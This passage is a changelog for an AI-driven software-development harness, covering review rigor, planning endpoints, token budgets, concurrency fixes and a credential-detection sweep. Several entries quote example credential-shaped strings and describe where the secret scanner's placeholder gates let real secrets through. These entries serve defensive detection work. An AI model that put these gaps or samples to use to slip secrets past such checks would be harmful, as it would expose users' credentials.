  produced 36, then 70, then 82 findings, never converging.
- **A per-cycle findings cap**, by rigor level: `quick` 5, `standard` 10,
  `thorough` 20. The highest-severity findings are kept; a dropped-count
  advisory finding records how many were not shown.
- **`quick` converges in one pass.** The PRD and plan review loops run
  exactly one cycle at `quick` rigor and accept regardless of outcome — the
  adversarial reviewer's findings stand as advisories (never falsely
  dispositioned `fixed`) rather than gating approval or triggering a revise
  cycle. The change-set review is not relaxed the same way — critical/high
  findings in the diff block at every rigor level; `quick` only means one
  review pass and a smaller findings cap (see Fixed, below). A
  system-deny check (secret sweep, host-exec, blob-digest mismatch) is
  unaffected at every rigor level — it is a security invariant, not a rigor
  knob.
- **The reviewer, PRD-author, framing ("explore") and planner prompts now
  receive the project's measured scale, detected stack (from `go.mod`,
  `package.json`, `Cargo.toml`, etc.), effective rigor, and — capped at 4000
  bytes — the project's own conventions doc (a CONVENTIONS.md or
  CONTRIBUTING.md file, when one exists)**, with an explicit instruction to
  judge proportionately and, for the PRD/framing
  prompts, not to add infrastructure (a database, a queue, a cache) the
  project does not already have unless the idea itself asks for it (review
  B5).
- **The planner prompt now targets 2-4 vertical-slice tasks**, each shipping
  working end-to-end functionality, rather than one task per layer or per
  requirement — one task per requirement only when the plan is genuinely
  that granular (review B3).
- **Plan-editing endpoints** (review B3): `POST
  …/initiatives/{id}/tasks/{taskId}/depends-on` sets a task's `depends_on`
  wholesale, refusing a change that would introduce a cycle anywhere in the
  graph; `POST …/initiatives/{id}/tasks/{taskId}/split` splits one task into
  two or more, each defaulting to the original's requirements and inheriting
  its dependencies; `POST …/initiatives/{id}/tasks/merge` merges two tasks —
  requirements union onto the survivor, statements concatenate, every
  dependency edge rewires onto the survivor, and the merged task is deleted.
  All three share the existing task-editable guard.
- **A change-set review finding can name its file and self-report whether it
  is in the diff** (`path`, `in_diff` on the change-set review schema and on
  `Finding`; review B2, adopted #5). Deterministically: a `path` that is not
  one of the change set's files is `advisory` ("about code this change set
  did not touch"); with no `path`, the reviewer's own `in_diff` decides
  (defaulting to `true`, so a reviewer that never sets it is unaffected),
  noted `"unverified"` either way. `Finding.advisory` (new field, along with
  `path`/`in_diff`) never blocks approval regardless of severity — this is
  the same field the rigor cap's dropped-count note uses, doubling as a
  simple backlog marker (migration 29).
- **Near-duplicate decisions and questions are merged at creation**, not only
  at display (review B4, adopted #8): same `DecisionType` (for decisions) and
  a token-Jaccard similarity of at least 0.85 after normalization
  (`workflow.jaccardSimilarity`, reusing `dedup.go`'s `tokenize`/
  `normalizeJudgment`) — replacing the old 0.6-of-shorter-side overlap
  measure, which wrongly merged genuinely distinct judgments ("which
  database?" vs. "which cache?" is now correctly kept apart: Jaccard 0.5). A
  question that matches one already answered is not re-created; a
  `question.reraised_answered` event links the re-raising to the answered
  original.
- **`POST …/initiatives/{id}/decisions/accept-recommendations`** resolves
  every open decision with its own recommendation, actor `human`, in one call
  (review B4) — the ICP round's "53 things need your judgment" answered
  directly. A decision with no recommendation is left open and named in
  `skipped`.
- **`GET …/initiatives/{id}/triage`** ranks open decisions, questions and
  blocking findings by impact (blocking, then severity, then dependents
  count) and labels the top 3 `priority`, the rest `optional` (review B4).
- **A readable 409 on task delete** (review B3): naming every dependent task
  by code, e.g. `TASK-1 cannot be deleted: TASK-3, TASK-4 depend on it.
  Remove those dependencies first, or delete them too.` — it used to be the
  undifferentiated `another task depends on this task; remove that
  dependency first`.
- **Guidance is honest after a fresh change-set failure** (review C6).
  `projection.BuildGuidance` now takes the initiative's recent change sets
  (signature change, `BuildGuidance(ini, understanding, recentChangeSets)`;
  the daemon's `/guidance` handler is the only caller, updated) and, when the
  latest one was rejected, had changes requested, or conflicted, names it and
  the next step instead of the unconditional "The reviewed plan is ready to
  build" a `plan_approved` initiative used to get regardless.

- **A per-initiative "what changed" timeline in human language** (C1, JTBD 6). `GET
  …/initiatives/{id}/timeline?since=` returns `[{at, kind, title, detail, ref}]`, newest first,
  scoped to the initiative throughout — the old `idea changed` read the whole project's event log
  with no initiative filter at all and could report another initiative's counts, and narrated only
  raw event type names ("`change_set.status_changed`") for anything it did not special-case. Entries
  read like "CHG-4 applied: rate limiting (2 files)", "CHG-3 denied: a credential at
  src/keys.js:14", "DEC-2 reopened: which database?", "2 requirements may be invalid", "execute
  initiative failed". `idea changed` now calls this endpoint; `GET …/initiatives/{id}/changed` (and
  the web What Changed widget built on it) is unchanged except that it, too, is now correctly scoped
  to the initiative it is asked about.
- **Short initiative titles** (C1). `Initiative.short_title` (≤ 60 chars) is generated
  deterministically on create from the idea's full text: its first sentence or clause, a common
  lead-in ("I want to", "Build", "Add", …) dropped, trimmed at a word boundary. `title`/`description`
  keep the full prompt; clients show `short_title || title`. An initiative created before this field
  existed gets one generated and persisted the first time it is read (`GET …/initiatives`/`GET
  …/initiatives/{id}`), identically every time (migration 31).
- **Evidence from tests** (C2). Each requirement in `GET …/initiatives/{id}/requirements` gains
  `evidence_tests: [{name, status, change_set}]`: tests the verification plan names for it, or
  whose name contains its code, resolved against the most recently parsed "tests" check output
  across the initiative's change sets. The verification-design schema's `hooks` items may now name
  `tests: [names]`, recovered from the rendered verification-plan artifact. Parsing covers `node
  --test` (TAP `ok`/`not ok`), `go test -v` (`--- PASS`/`--- FAIL`), `pytest -v`, and jest-style
  `✓`/`✗` lines, best effort. `POST …/initiatives/{id}/verify {"confirm_passing_tests": true}`
  confirms every requirement whose mapped tests all passed, through the existing human-evidence
  path with the actor set to `human` — nothing is ever auto-verified without this explicit request.
  `idea verify --confirm-passing-tests` calls it.
- **Cost and time** (C3). `GET …/initiatives/{id}/costs` returns `{total_usd, by_phase: [{phase,
  usd, seconds, calls}], agent: {runs, seconds, usd, note}}` from the run records: model calls are
  now attributed to their initiative and workflow stage (`runs.initiative_id`/`runs.stage`,
  migration 31), so spend/time can be grouped by phase. Agent (coding) run spend is parsed
  best-effort from the agent's own console output when every counted run's cost could be recovered;
  otherwise `usd: null` with `note: "agent spend not measured"` — never a partial or guessed total.
  `idea status` prints the initiative's total spend and time. Operations gain `stage` (e.g. "Writing
  the PRD", "Reviewing the PRD (cycle 2)", "Agent running TASK-2", "Running checks"), set by a
  callback as the engine moves between steps; the CLI's wait loop prints it in place of a bare
  "still working…".
- **"Rerun with a note to the agent"** (D-a). `POST …/initiatives/{id}/execute` and `POST
  …/initiatives/{id}/retry` accept an optional `note`, decoded as leniently as `fresh`. On execute
  it is appended to the implementer's brief and recorded on the agent run. Retry re-runs
  framing→research→PRD→review rather than the implementer, so there is no implementer brief for it
  to join at that stage; there, the note joins the framing prompt that restarts the pipeline and is
  recorded on that run instead. `idea execute --note <text>` / `idea retry --note <text>`.
- **A cross-initiative "needs you" queue** (D-b). `GET /api/v1/projects/{projectId}/queue` returns
  `[{initiative_id, short_title, kind, label, rank, href}]` covering every initiative in the
  project: open blocking decisions, change sets awaiting review, conflicts, denials, stale items,
  and verifications ready to confirm — ranked blocking first, then by age.
- **`git_allow_default_branch`, `git_branch_per_initiative` and `review_rigor` round-trip through
  `GET`/`PUT …/providers`** alongside `git_commit` (these were already the config fields underneath;
  the endpoint had no way to read or write them). `review_rigor` is validated against
  `auto|quick|standard|thorough`.

### Changed

- **`security.FindCredential`'s catalog now names a kind and exposes a stable
  value capture group per pattern** (`security.FindCredentialsInFile`,
  `security.Fingerprint`), so a match can be located, named and fingerprinted
  without ever returning the value itself.
- **`docs/security-model.md`** documents `secret_sweep` as conditionally
  overridable by the `not_a_secret` disposition, mirroring
  `review_open_blocking` — the only two system-deny conditions a human may
  overrule.

- **Only live inputs reach design and plan (review A2).** Design, product
  design, verification design, the execution plan, and plan review used to
  see every requirement and decision ever raised, including ones a later
  review cycle superseded and decided human decisions the model then treated
  as still open for debate. They now see only `activeRequirements` (already
  used by the M1 loop) and the equivalent `activeDecisions`. A deterministic
  check blocks the plan (`plan_traceability`, target `execution_plan`) when a
  task's own text cites a superseded requirement code; a second, advisory-only
  check flags a task whose words overlap a decided decision's rejected option
  more than its actual resolution (a heuristic, documented as such on the
  finding's `note`).
- **Generated tasks were silently missing their `implements` edge (review A4,
  JTBD 5).** Root cause: `runExecutionPlan` matched the model's free-text
  requirement reference against `Requirement.Code` and, on a miss, passed an
  empty target id to `createTask`, which wires nothing and records nothing —
  unlike an unresolved `depends_on`, which already failed loudly. A task's
  requirement reference (`requirement` for compatibility, plus the new
  `requirements` array) now resolves tolerantly (trimmed, case-insensitive,
  "REQ-3: title" forms) and, on a genuine miss, raises a blocking
  `plan_traceability` finding and parks the initiative for re-planning, the
  same way `depends_on` does.
- **A task can implement more than one requirement (N:M).** `CreateTaskMulti`
  and the `add task` / `update task` API (`requirement_ids`, merged with the
  single `implements` field) wire an `implements` edge to each. Adding or
  editing a task now requires naming at least one requirement.
- **`impact`/`why` reached a dead end at a task (review A4).** A task's change
  sets are linked by `ChangeSet.TaskID`, not a graph edge, so `impact
  requirement REQ-n` or `impact decision DEC-n` could reach the task and never
  the change sets built from it. `Impact`/`ImpactCounts` now include a task's
  change sets as synthetic dependents.
- **Reopening a decided decision now marks its dependents stale.** The
  requirements that cite it, their tasks, and the applied change sets for
  those tasks are marked stale (a new `stale_marks` table/primitive) and
  surfaced as `stale_items` on `GET …/guidance` (with a "N items may be
  invalid since DEC-n changed" sentence naming the re-plan/review path) and as
  `staleness: "stale"` on `GET …/impact`. Re-planning (`revise-plan` /
  `reopen-phase`) clears every stale item for the initiative; `POST
  …/stale/{staleId}/ack` clears one explicitly.

### Fixed

- **The change-set adversarial review could truncate on a real diff and wedge
  the initiative behind an unreachable remediation.** Observed with a real
  model (claude-sonnet-5) on an 11-file, ~26 KB diff: the review failed
  twice, identically, with `model: output truncated at the token budget …
  raise the stage budget or use a model with a larger output ceiling`. The
  suggested fix was unreachable — `MaxOutput` was a hardcoded provider
  constant (16384 for Anthropic and OpenAI, 8192 for Gemini) that
  `review.max_tokens` never touched — and once truncated, the change set sat
  in `review_required` with no completed review: `idea execute` refused to
  re-run the task (the never-completed-review guard) and `idea review <id>
  approve --accept-findings` refused too, because it still required a
  completed review. Fixed at all three layers:
  1. **Capability accuracy.** Every provider's real, currently-documented
     output ceiling is now used per model instead of one guessed constant —
     Claude Sonnet 5/Opus 5/Fable 5.1/Opus 4.8 raise to 128,000 (Haiku
     4.5/Sonnet 4.5 stay at their real 64,000), current OpenAI models raise to
     128,000/32,768/100,000 depending on the model (gpt-4o/gpt-4o-mini stay at
     16,384, their real ceiling), and Gemini's 3.x Flash models raise to
     65,536 — verified against each provider's own model documentation, not
     guessed from a price tier.
  2. **`review.max_tokens` is now reachable.** It used to be read in exactly
     one place — a post-hoc check that could only *fail* a stage whose output
     exceeded it — and never raised what was actually requested. Setting it
     now directly overrides the request budget sent for every stage (still
     bounded by the model's real ceiling above), and a truncation error now
     names it as the fix instead of the old, unreachable "raise the stage
     budget".
  3. **No wedge, no silent truncation.** A truncated reply is retried once
     with a smaller ask (fewer findings, more concise) before giving up. If a
     change-set review still cannot complete, that is now recorded explicitly
     on the change set (never silently) instead of failing the whole run: the
     task is still marked done, and `idea review <id> approve
     --accept-findings` is the supported, explicit way forward — a change set
     whose review was simply never attempted (e.g. a cancelled operation)
     still refuses exactly as before, so an unreviewed change set still
     cannot be silently approved.
- **A real Anthropic truncation (and the same class of reply from OpenAI or
  Gemini) never became `model.ErrTruncated`, bypassing the recovery above.**
  A follow-up live probe found that when `claude-sonnet-5` is cut off before
  it finishes reasoning, it can return a lone `thinking` block with no text
  block at all — observed on the wire as `stop_reason: max_tokens` with zero
  text content. `anthropic.go` checked for empty content *before* checking
  `stop_reason`, so this reply produced a generic `anthropic: empty content
  (stop_reason=max_tokens, …)` error instead of `model.ErrTruncated`: no
  retry-with-a-smaller-ask, no `review_unavailable_reason` recorded, and
  `idea review <id> approve --accept-findings` refused with "likely
  cancelled mid-review" — a truncation reported as a cancellation, with the
  documented escape unreachable. The same ordering hazard existed in
  `openai.go` (empty message content before `finish_reason=length`) and
  `gemini.go` (empty parts before `finishReason=MAX_TOKENS`). All three now
  check the provider's own finish/stop reason first, so a length-stop with
  empty or thinking-only content is always reported as truncated.
- **The review stage's default output-token ask was still the flat 16,384 it
  had before the capability-accuracy fix above, so the same truncation
  recurred by default.** Removing the old hardcoded per-provider clamp only
  helped once a caller actually asked for more than 16,384; nothing did,
  until a human hand-edited `review.max_tokens` in `harness.yaml`. The
  review stage's default ask is now derived from the model's own verified
  output ceiling (capped at 32,000 — the same size as the PRD stage's own
  want, chosen so the default is not itself a full-ceiling ask on every
  call, which would be needlessly slow and expensive for the common case),
  so a `claude-sonnet-5` review now defaults to 32,000 instead of 16,384.
  `review.max_tokens` still overrides this default outright when set.
- **Architecture/design-stage decisions carried no provenance.** Resolving or
  reopening one marked no dependent requirement/task/change-set stale, and
  `/impact` reported "No dependents found" — on a real run, DEC-2..DEC-5 (all
  raised in architecture/design) had empty provenance, and TASK-2 kept the
  title "token-bucket" after the human chose "fixed-window". PRD-phase
  decisions wire a requirement's own `decision` citation
  (`runProductDefinition` / `WireRequirementDerivedFromDecision`);
  architecture/design decisions (`createDesignDecision`) never wired anything.
  The `Architecture`/`ProductDesign` schemas' decision items now carry an
  optional `requirements` field (the Requirement code(s) the decision shapes),
  and `createDesignDecision` wires `requirement --derived_from--> decision`
  from it, deduplicated against edges already wired so a decision merged
  across both phases is not double-wired (which would double-count it in
  `/triage`'s dependents tally).
- **A later design phase re-asked a question the human had already
  answered.** On the same run, the human answered "API keys come from an
  environment variable, never a file" in `define`; the architecture phase
  re-asked essentially the same question as a fresh Decision (DEC-3) and
  recommended a config file. `createDesignDecision` never consulted the
  questions table at all (unlike `runProductDefinition`'s own
  `createDecisionIfNew`) and matched existing decisions by exact normalized
  text only, not the fuzzy `similarDecision` match the PRD phase uses. It now
  checks answered questions first (a match is a no-op, recording the same
  `question.reraised_answered` event `createQuestionIfNew` does, so the audit
  trail shows the re-ask rather than nothing) and matches existing decisions
  by `similarDecision`; a match against an already-DECIDED decision wires any
  newly-cited requirements to it and returns rather than recording a
  "dissent" against a human's own resolved choice. The architecture/product
  design prompts now also receive the initiative's questions
  (`renderQuestionsWithAnswers`, previously PRD-only) and are told not to
  re-raise one that already exists, open or answered.
- **Guidance recommended `idea revise-plan` before any plan existed.** A PRD
  decision reopened while the initiative was still `approved` (no
  design/plan phase run yet) marks its requirement stale immediately, and the
  stale-items advice on `/guidance` named `idea revise-plan` unconditionally —
  a command that refuses outright in that status ("no plan to revise ... no
  execution plan exists yet"). The advice now only names `revise-plan` (or,
  when a change set already holds work, explains why it is unavailable and
  what to do instead — review M5, unchanged) once the initiative actually has
  a plan (`plan_approved`/`needs_human_judgment`); before that it says the
  stale items will be incorporated when the plan is generated.
- **`idea pr` told you to enable a setting you had already enabled.** With
  `git.branch_per_initiative` already on and no change set applied yet (so no
  `GitCommitWarning` to name either), the error still said "enable
  git.branch_per_initiative and apply a change set first" — review defect D's
  fix for the *specific-reason* case still `%w`-wrapped the generic
  `ErrNoInitiativeBranch` sentinel, which reproduces its full text regardless
  of what came after it. Both the specific-reason and the plain "nothing
  applied yet" cases now get their own message naming the actual missing
  precondition (`noInitiativeBranchError`, `Unwrap`s to the same sentinel so
  `errors.Is` classification is unchanged) instead of repeating "enable
  git.branch_per_initiative".
- **Every user Stop logged `level=ERROR msg="execute failed" err="context
  canceled"`.** `CancelOperation`'s cancellation unwinds the in-flight call as
  a plain `context canceled` error, and `failOperation` logged that at ERROR
  alongside a genuine failure — so an ordinary click on Stop read like a
  crash in the daemon log. A cancellation now logs "stopped by you" at INFO;
  a real failure (the operation was not cancelled) still logs at ERROR with
  its original message.


- **The placeholder/entropy work silently weakened REDACTION, not just
  detection (Critical).** `RedactString` (the blob store's own redactor)
  filtered every catalog match through the same validity gate used to decide
  whether to raise a FINDING — which for most patterns includes a
  placeholder-vocabulary/low-entropy check — so a real secret that merely
  *looked* like a placeholder (a Slack token whose numeric ID segments
  produced a 4-digit run by chance, `DB_PASSWORD=latestProdPw9xK2` —
  `containsPlaceholderWord`'s old bare substring check let `"test"` match
  inside `latest`) passed through into persisted artifacts, findings and
  agent output completely unmasked. Fixed: `RedactString` now redacts every
  raw regex match unconditionally (a narrow structural exclusion remains for
  the generic assignment rule's own variable-reference/function-call/
  template checks, which were never about placeholders); `containsPlaceholderWord`
  now compares whole word/segments, never substrings; and the placeholder-
  shape check (`isPlaceholderShape`, a repeated-character run or low
  entropy) no longer applies to any provider-specific format at all — a
  Monte-Carlo run over 200k random well-formed keys per format found it
  missed a real secret 1 in 68 times for Slack, 1 in 3,200 for AWS, and 1 in
  6,100–9,500 for the rest, because the vendor prefix is already the
  evidence a match is real. Every provider-specific pattern now always
  raises a finding too (`Overridable`, so a human can still dismiss an
  obvious placeholder).
- **A PRD revision re-pointed a requirement's statement while keeping
  `verified` and its evidence (Critical).** `ReviseInitiative` matched
  requirements by code and blind-`UpdateRequirement`'d statement/
  acceptance_criteria, leaving `status`, `verified_at` and every
  `verification_evidence` row untouched — and revise is claimable from
  `complete`, so an initiative could report `complete`, on surviving human
  evidence, for a statement that no longer exists. `UpdateRequirement` now
  resets a changed requirement's status to `approved`, clears `verified_at`,
  and deletes its verification evidence, all in the same transaction as the
  statement/criteria update — but only once the requirement has left draft,
  so a still-in-review PRD revision cannot jump a requirement past the
  review gate it hasn't passed yet. Separately, a revision response naming
  the same requirement code twice used to last-writer-win silently
  (`priorByCode` matched by lookup, not consumed); it's now refused outright.
- **`UnverifyRequirement` left pass evidence in place after a revert
  (High).** Reverting a change set flips a verified requirement back to
  `approved`, but `PassedCriterionKeys` is status-blind and counts every
  pass row regardless of age — so a bare `idea verify` with nothing new on
  disk re-marked the requirement (and the initiative) verified/complete from
  evidence that predated the revert. `UnverifyRequirement` now clears the
  requirement's verification evidence in the same transaction as the status
  reset.
- **Migration 31 left `runs.initiative_id = ''` for every pre-upgrade row
  (High).** `ListModelPhaseCosts`/`ListAgentRunStats` both filter
  `WHERE r.initiative_id = ?`, so an initiative that existed before that
  upgrade permanently reported $0.00 / 0 calls from `GET .../costs` even
  though the spend still sits in `run_manifests`. Migration 35 backfills it
  from the product graph: a run's `initiative_id` is recovered from any
  `produced_by` edge pointing at it (`graph_edges WHERE to_type = 'run'`),
  when one exists.
- **Two security guards raised critical blocking findings with no
  placeholder gate at all (High, over-blocking).** `bearer token` and
  `URL userinfo credential` had no validator whatsoever — no entropy,
  placeholder, template, or test-path gate — so
  `Bearer YOUR_TOKEN_HERE_XXXXXXXXXX` and
  `mysql://root:examplepass@127.0.0.1/db` raised a critical blocking finding
  even in a `*_test.go` file. Both now get the same placeholder/template/
  test-path treatment the generic "credential assignment" rule already had,
  while a realistic bearer token or DSN password still blocks everywhere.
  `docs/security-model.md` no longer claims the placeholder/entropy gate
  covers every provider pattern (it never applies to a provider-prefixed
  format at all now, per the Critical fix above).
- **`maskValue` revealed 50% of a 16-character secret (Low).**
  `Hq7zR2mVx9LpQwEr` → `Hq7z…QwEr` in `SecretPreview` on every finding.
  Scaled down: nothing is revealed below 16 characters (unchanged), at most
  1 character per side from 16–23 characters, and the previous
  `min(4, len/4)` reveal only starts at 24 characters.


- **`lockPlanEdit` covered the handlers but not the writers it was meant to
  exclude (Critical).** `RevisePlanInitiative`/`ReopenPhaseInitiative` call
  `DeleteTasksForInitiative` without ever taking the per-initiative
  plan-edit lock, and every Plan-editing handler read the initiative
  *before* taking that lock and then guarded against that stale snapshot —
  so a concurrent `add-task` could answer 200 OK for a task a revise/reopen
  in flight had already wiped. Fixed: those three entry points now take the
  same lock around their claim, and every handler re-reads the initiative
  *after* acquiring it (`lockPlanEditFresh`) instead of trusting the
  pre-lock read; request bodies are decoded before the lock/guard, not
  between them.
- **Reloading a project's config raced roughly twenty unsynchronized readers
  (High).** `ReloadProject` mutated a `*projectRuntime`'s fields
  (cfg/registry/redactor/blobs) in place under `r.mu`, while every HTTP
  handler read them off a `*projectRuntime` it already held with no lock of
  its own — proven by the race detector against handlers.go's provider/
  redaction/queue/evidence call sites. `ReloadProject` now builds a fresh
  `*projectRuntime` and swaps the map entry instead (engine, DB and the
  plan-edit lock registry are carried over unchanged); `workflow.Engine`
  gained its own `cfgMu` so `Run`/`Advance`/`Retry`/`RevisePlan`/`Resume`/
  `ReopenPhase` and their helpers read a consistent snapshot instead of the
  raw, unguarded fields. `idea resume` also now records an operation row (it
  previously ran with none), so a reload can no longer land mid-review-loop
  and a crash mid-resume is no longer invisible to the startup sweep.
- **Retry could resume from a phase whose persistence never finished
  (High).** `runFraming`/`runResearch`/`runProductDefinition` commit their
  phase's artifact and then write its real payload (assertions/requirements/
  decisions/questions) as separate, cancellable store calls on the same
  context — a Stop between the artifact commit and that payload (proven:
  "Stop after 6 of 20 `CreateRequirement` calls") left the artifact durable
  and the payload truncated. `completedPhases` then saw "artifact exists"
  and skipped the phase entirely on retry, building review/architecture/plan
  from a silently truncated set at real model cost. Each phase's payload
  writes now run under `context.WithoutCancel` once its own model call has
  already returned and been billed, so a cancellation from that point stops
  the *next* phase, not this one's already-earned result.
- **Two claim-integrity gaps allowed two pipelines on one initiative
  (High).** `VerifyInitiative` ran with no synchronization of its own, so it
  could reach `CompleteInitiative` while `Execute`/`ApplyChangeSet`/
  `RevertChangeSet` were still actively mutating files — proven: a
  concurrent verify completed the initiative mid-apply, after which `idea
  revise` (which legally claims `running` FROM `complete`) claimed it out
  from under the still-running apply, and apply's own unconditional release
  then overwrote revise's live claim on completion. `VerifyInitiative` now
  takes the same engine mutex those three hold for their whole duration, and
  apply/execute/revert's release-back-to-prior-status is now a CAS
  (`ReleaseInitiativeClaim`, `WHERE status = 'running'`) so it can no longer
  stomp a legitimate write that landed while it waited. Separately, a panic
  in an operation that never claims the initiative at all
  (`SuggestAnswersInitiative`) used to call `FailInitiative` unconditionally
  on whatever initiative id its row carried, which could fail a live,
  unrelated claim out from under it; `failOperationAfterPanic` now only
  releases for operation types that actually claim.
- **`RecordHumanEvidence` was not atomic (Medium).** Clearing prior
  verification evidence, recording a fresh human judgment per acceptance
  criterion, and the resulting requirement-status transition ran as N+2
  separate transactions; a crash between any two of them destroyed the old
  judgment without recording the new one. Now one transaction.
- **Stale marks were never garbage-collected (Medium).** A requirement's
  mark survived its own supersession and a change set's mark survived
  revert/reject — display-only noise, but permanent. Superseding a
  requirement and reverting/rejecting a change set now clear that target's
  own active stale mark(s) in the same transaction as the state change.
- **Concurrent first-open of an un-migrated database failed roughly 3 of 4
  times (Medium).** The per-migration "already applied?" check ran as a
  standalone `SELECT` outside any transaction, so two connections opening
  the same fresh database for the first time could both see "not yet
  applied" before either committed and both run the same DDL — the second
  then re-running `ALTER TABLE … ADD COLUMN` (etc.) a SQLite had already
  applied. Each migration now claims its version by `INSERT`ing into
  `schema_migrations` (its primary key) *before* running its DDL, so a
  losing connection hits a constraint violation instead of repeating work;
  `configure()` also retries the journal-mode pragma a few times on
  `SQLITE_BUSY`/`LOCKED`, the same lock two first-opens can transiently
  contend on.


- **`evidence_tests` mapped almost nothing on a real run, across two
  compounding bugs.** A real test's name almost never contains its
  requirement's code (`TestRateLimiterAllowsWithinBudget` for a per-key-
  rate-limiting requirement has no "REQ-5" in it anywhere), so the original
  name-contains-code tier left `evidence_tests` null on every requirement
  despite `go test ./...` passing 15 tests. `ComputeEvidenceTests` gained a
  third tier (`taskDerivedTests`/`decodePatch`): test functions found in
  test/spec files touched by the applied, check-passed change set of a task
  that `implements` the requirement (a task→requirement edge, never a guess
  at what the task was for). That tier was itself broken from the day it
  shipped: it resolved against the redacted `blobs` store, but a change
  set's patch manifest and file content are only ever written to `rawBlobs`
  (see `workflow.Engine.contentBlobs`) — so every patch lookup silently
  missed and it mapped nothing on any real run either, until
  `ComputeEvidenceTests`/`BuildQueue` were changed to take both stores
  explicitly (an unreadable patch/file now logs a warning instead of failing
  silently). Separately, the other tiers were also broken against REAL check
  output: `checkCommand` always prepends a human-readable `image: ...` (and
  sometimes a `<config> not configured; detected ...`) line before a
  `go test -json` stream, and `looksLikeGoTestJSON` required the *first*
  line to be JSON — so real evidence never parsed as JSON at all and fell
  through to a free-text parser that finds nothing in a stream of
  `{"Action":...}` lines; it now scans every line for a recognized `go test`
  test2json `Action`. The skip reason for a genuinely unmapped requirement
  now says so — "no tests are mapped to REQ-n; ..." — instead of the
  misleading "not every mapped test passed", which reads as a test failure
  when nothing was ever mapped at all. A new end-to-end test
  (`internal/daemon/evidence_two_store_test.go`) uses the real two-store
  daemon setup and real (prefixed) `go test -json` evidence throughout.
- **`git.branch_per_initiative` did nothing unless `git_commit` was also
  set**, though its own name and doc never said a second flag was needed;
  `idea pr`'s own error told a user to "enable git.branch_per_initiative and
  apply a change set first" with no mention of one. Setting
  `git.branch_per_initiative` alone is now sufficient to commit. Also: a
  fresh, still-untracked `.idea-harness/` (harness.yaml, project.yaml,
  roles/) and files from this same initiative's own earlier applied change
  sets (applied while `git_commit` was off) used to refuse every later apply
  forever with "uncommitted changes outside this change set" — `.idea-harness/`
  never counts as dirty for this guard now, and the earlier change sets' own
  files are caught up onto the initiative's branch as their own commit
  instead of blocking. `idea init` now writes `.idea-harness/.gitignore`
  (ignoring only the harness's own scratch state, never the committable
  config), and `idea pr`'s error names the specific reason (a guard refusal,
  an unrelated dirty file) when one was already recorded, instead of only
  repeating the generic advice.
- **Stop/continue was unverifiable.** `capturePartial` logged nothing at all
  on its "nothing to keep" path (a genuinely empty diff, e.g. Stop landing
  before the agent had written anything), making it indistinguishable from
  "never ran" or "silently failed" — it now logs its outcome on every path.
  The timeline's entry for a user-initiated Stop showed the raw
  `context canceled` the daemon unwinds internally ("Execute initiative —
  context canceled"), reading exactly like a crash; it now says "Stopped by
  you". Separately, `docker logs --tail 100` followed by `scrubAgentLog`
  dropping blank/noise lines left only ~70 real lines of `agent_output` on a
  real run, short of the 100 documented and requested — `tailLogs` now asks
  for a generous multiple of raw lines up front so the requested count
  reliably survives scrubbing. Hermes's own CLI documentation was checked for
  a streaming/verbose flag that might explain output going silent for
  minutes at a time; none is documented as affecting buffering when stdout is
  piped rather than a TTY, so nothing was guessed into `hermesArgs` — see
  `docs/agents.md`'s "Live output during a run" section for the full
  investigation and what would still need verifying against a real container.
- **A temporary `.idea-harness-<random>` file could appear directly beside a
  user's own tracked files during apply/revert.** `fsdiff.writeAtomic` staged
  its atomic-write temp file in the destination's own directory
  (`os.CreateTemp(filepath.Dir(dest), ".idea-harness-*")`); an interrupted
  daemon (crash, kill, container OOM) between the write and the rename could
  leave it there, indistinguishable from a real file to `git status`. It now
  stages through `.idea-harness/tmp/` (excluded from every snapshot/diff by
  name already, and from the branch-per-initiative dirty check as of this
  release), staying on the same filesystem as the destination so the final
  rename is still atomic.

- **The change-set adversarial review now runs once, when the change set is
  created, not again on every `idea review <CHG-n> approve`.** A founder-
  journey run spent 64% of its model budget re-running the reviewer on every
  plain `approve` call (15s–2.5min each), and since a model reviewer is not a
  fixed point, a finding a human had just marked `rejected` came back
  reworded at the same severity, so approval never converged without
  `--accept-findings`. The review now runs inside `Execute`, immediately
  after checks pass and the change set's content is fixed (its `PatchDigest`
  never changes afterward); `idea review <CHG-n> approve` (without
  `--accept-findings`) now only evaluates the findings already on the change
  set plus whatever the human has since dispositioned — the same gate
  `--accept-findings` already ran through — and makes no model call. A new
  `Engine.inheritDispositionFromPrior` carries a human's disposition of a
  finding forward onto a near-duplicate (same target type, path, category,
  and similar text) raised by a later, legitimate re-review of the same
  subject (`idea revise`'s PRD re-review, `idea revise-plan`/
  `idea reopen-phase`'s plan re-review), so a reworded twin of an
  already-judged finding does not silently re-block approval there either.
- **`idea review <CHG-n> approve` no longer risks a client-side timeout
  outliving a fast-enough server action, and a client timeout now says the
  action is likely still running and how to check.** The fix above already
  removes the model call that made this endpoint slow; as a backstop, the
  CLI now translates any client-side HTTP timeout into a message naming the
  request that timed out and pointing at `idea status`, `idea watch`, and
  `idea cancel <op-id>` instead of a bare "context deadline exceeded".
- **Reverting a change set now returns its task to `proposed` so `idea
  execute` can re-run it**, when no other applied change set for the same
  task still implements it. Previously the task stayed `done` forever after
  a revert, so `idea execute` printed "✓ execute started" and then failed
  "no ready tasks ... (dependencies not satisfied)" in the background, with
  no documented way back short of editing the database. `idea execute`
  (and the daemon's execute endpoint) now also checks synchronously, before
  launching, whether a ready task exists at all, and refuses with a clear
  message (naming `idea verify` when every task is done) instead of
  accepting and failing asynchronously.
- **`idea status`/`/guidance` now say "Review CHG-n" or "Apply CHG-n" instead
  of "run the next task" while a change set is awaiting the human's own
  review or apply**, and say "Run `idea verify`" once every task is done
  instead of repeating "run the next task" forever with nothing left to
  run. `LatestChangeSetsPerActiveTask` no longer excludes a `done` task's
  change set — `Execute` marks a task `done` as soon as its change set
  passes checks, before it is reviewed, approved, or applied, so the old
  exclusion hid exactly the change set guidance most needed to report.
- **Decisions and answered questions now reach the implementer.** A
  founder-journey run answered "keys in an env var" and the implementer
  built a JSON config file instead, because nothing in the planner's model
  inputs, or the brief it produces, ever named a resolved decision or an
  answered question — and `AnswerQuestion`'s answer text (content-addressed,
  keyed by a digest) was never actually read back anywhere, only whether a
  question was "answered". `runPlanner`'s prompt and the deterministic
  implementer brief now both include resolved decisions and answered
  questions (with their real answer text, via the new
  `Engine.renderQuestionsWithAnswers`/`resolvedDecisionsAndAnswers`).
  Resolving a decision after a plan/tasks/change sets were already built on
  it (possible once quick rigor lets a plan through with an open decision)
  now marks those requirements/tasks/applied change sets stale, the same
  way reopening a decided decision already did. Guidance shown while
  proceeding past PRD/plan approval also now names any still-open
  decisions/questions instead of saying nothing about them — advisory only,
  since an open decision/question is a normal, expected state mid-workflow
  and must not itself block approval.
- **Stopping a run during Execute's adversarial review left a change set
